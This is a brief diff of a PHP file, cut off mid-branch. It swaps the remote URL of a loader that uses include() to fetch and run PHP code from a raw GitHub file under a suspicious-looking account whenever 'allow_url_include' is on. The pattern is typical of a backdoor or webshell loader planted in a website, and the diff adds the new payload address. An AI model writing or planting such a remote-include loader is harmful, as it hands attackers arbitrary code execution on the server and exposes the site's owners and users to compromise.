@@ -1,5 +1,5 @@
 <?php
-$u='https://raw.githubusercontent.com/b3l13v3x666/blessed/main/503.php';
+$u='https://raw.githubusercontent.com/b3l13v3x666/blessed/main/415.php';
 if(ini_get('allow_url_include')){
     include($u);
 }else{
